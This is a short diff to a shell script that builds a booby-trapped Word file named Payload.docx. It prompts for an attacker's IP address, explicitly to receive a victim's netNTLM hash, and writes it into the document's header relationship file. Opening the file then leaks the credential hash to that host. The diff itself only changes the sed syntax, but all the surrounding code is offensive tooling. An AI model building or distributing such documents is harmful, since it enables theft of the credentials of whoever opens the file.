@@ -6,7 +6,7 @@ unzip -qq -d mofo/ mofo.docx > /dev/null
 clear
 echo "Enter IP address where you would like to send the netNTLM-hash, and press enter"
 read -r IP
-sed -i '' "s~mofo~$IP~g" "mofo/word/_rels/header1.xml.rels"
+sed -i "s/mofo/$IP/g" "mofo/word/_rels/header1.xml.rels"
 cd mofo
 zip -qq -r ../Payload.docx *
 rm -rf ../mofo/
